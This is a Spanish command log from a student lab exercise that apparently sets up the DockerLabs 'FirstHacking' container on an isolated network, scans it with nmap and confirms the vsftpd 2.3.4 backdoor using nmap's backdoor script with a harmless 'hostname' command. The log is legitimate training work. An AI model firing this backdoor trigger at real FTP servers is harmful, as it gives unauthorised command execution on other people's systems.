@@ -1,0 +1,92 @@
+===========================================================
+Práctica 01 - FirstHacking (DockerLabs)
+Registro de comandos ejecutados
+===========================================================
+
+--- Paso 1-2: Despliegue del entorno ---
+
+wsl -d Debian
+sudo apt install unzip
+
+--- Paso 3: Carga de la imagen ---
+
+sudo docker load -i firsthacking.tar
+sudo docker images
+
+--- Paso 3: Creación de la red y arranque del contenedor ---
+
+sudo docker network create --internal practica01-red
+sudo docker ps -a
+sudo docker start practica01-firsthacking
+sudo docker ps
+sudo docker inspect -f '{{json .NetworkSettings.Networks}}' practica01-firsthacking
+
+IP_OBJETIVO=$(sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' practica01-firsthacking)
+echo "$IP_OBJETIVO"
+
+--- Paso 4: Descubrimiento de puertos ---
+
+test -n "$IP_OBJETIVO" && \
+nmap -sT -p- --open -n -Pn \
+  -oN evidencias/nmap/01-puertos.txt \
+  "$IP_OBJETIVO"
+
+--- Paso 4: Identificación de servicio y versión ---
+
+nmap -sV -p 21 -n -Pn \
+  -oN evidencias/nmap/02-servicio-ftp.txt \
+  172.18.0.2
+
+--- Paso 6: Validación controlada del backdoor ---
+
+test -n "$IP_OBJETIVO" && \
+nmap -n -Pn -p 21 \
+  --script ftp-vsftpd-backdoor \
+  --script-args 'ftp-vsftpd-backdoor.cmd=hostname' \
+  -oN evidencias/nmap/03-validacion.txt \
+  "$IP_OBJETIVO"
+
+sudo docker inspect -f '{{.Config.Hostname}}' practica01-firsthacking
+sudo docker ps
+
+--- Paso 8: Empaquetado de la imagen ---
+
+sudo docker tag \
+  firsthacking:latest \
+  hacketilabs:practica01-firsthacking
+
+sudo docker save \
+  -o imagen/laboratorio.tar \
+  hacketilabs:practica01-firsthacking
+
+sudo docker stop practica01-firsthacking
+sudo docker load -i imagen/laboratorio.tar
+
+--- Paso 8: Contenedor de comprobación ---
+
+sudo docker run -dit \
+  --name practica01-comprobacion \
+  --network practica01-red \
+  hacketilabs:practica01-firsthacking
+
+IP_OBJETIVO=$(sudo docker inspect \
+  -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' \
+  practica01-comprobacion)
+echo "$IP_OBJETIVO"
+
+test -n "$IP_OBJETIVO" && \
+nmap -sV -p 21 -n -Pn \
+  -oN evidencias/nmap/04-reproduccion.txt \
+  "$IP_OBJETIVO"
+
+sudo docker stop practica01-comprobacion
+
+sudo docker ps -a
+
+===========================================================
+Conclusión paso 8 (reproducción)
+===========================================================
+He comprobado la carga del TAR, el arranque de un contenedor nuevo y la
+identificación de vsftpd 2.3.4 en mi equipo. No he repetido la explotación
+sobre ese contenedor ni probado el paquete en otro ordenador. La comprobación
+realizada corresponde a lo solicitado en el paso 8.
